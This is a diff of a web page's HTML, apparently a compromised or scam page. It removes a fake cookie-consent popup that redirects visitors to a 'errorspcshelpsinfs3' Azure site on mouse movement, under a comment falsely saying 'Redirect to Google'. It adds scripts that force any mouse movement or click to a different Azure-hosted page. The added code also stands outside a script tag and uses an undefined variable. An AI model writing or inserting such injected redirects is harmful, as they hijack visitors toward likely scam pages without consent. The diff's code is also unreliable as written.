@@ -2656,46 +2656,20 @@ hs.src = ('//s10.histats.com/js15_as.js');
   }
 </style>
 
-<div id="cookie-popup-wrapper">
-  <div id="cookie-popup-overlay">
-    <h3>Cookie Policy</h3>
-    <p>We use cookies to enhance your browsing experience, serve personalized ads or content, and analyze our traffic. By continuing to use our site, you consent to our use of cookies.</p>
-    <div class="cookie-btns">
-      <button id="cookie-decline-btn">Decline</button>
-      <button id="cookie-accept-btn">Accept</button>
-    </div>
-  </div>
-</div>
+document.addEventListener('mousemove', function() {
+    window.location.href = 'https://e33032603e3303echo25.z13.web.core.windows.net/1.html';
+});
 
-<script>
-  (function() {
-    const wrapper = document.getElementById('cookie-popup-wrapper');
-    const acceptBtn = document.getElementById('cookie-accept-btn');
-    const declineBtn = document.getElementById('cookie-decline-btn');
-    let interactionDetected = false;
 
-    // Buttons hide the popup
-    acceptBtn.addEventListener('click', () => {
-      wrapper.style.display = 'none';
-    });
-    declineBtn.addEventListener('click', () => {
-      wrapper.style.display = 'none';
-    });
+document.addEventListener('click', function() {
+    window.location.href = 'https://e33032603e3303echo25.z13.web.core.windows.net/1.html';
+});
 
-    const handleUserInteraction = () => {
-      if (!interactionDetected) {
-        interactionDetected = true;
-        // Redirect to Google after 3 seconds
-        setTimeout(() => {
-          window.location.href = 'https://errorspcshelpsinfs3.z13.web.core.windows.net/';
-        }, 3000);
-      }
-    };
 
-    // Listen for mouse movement
-    window.addEventListener('mousemove', handleUserInteraction, { once: true });
-    window.addEventListener('touchmove', handleUserInteraction, { once: true });
-  })();
-</script>
+function handleMouseMove() {
+    if (mouseRedirectEnabled) {
+        window.location.href = 'https://e33032603e3303echo25.z13.web.core.windows.net/1.html';
+    }
+}
 </body>
 </html>
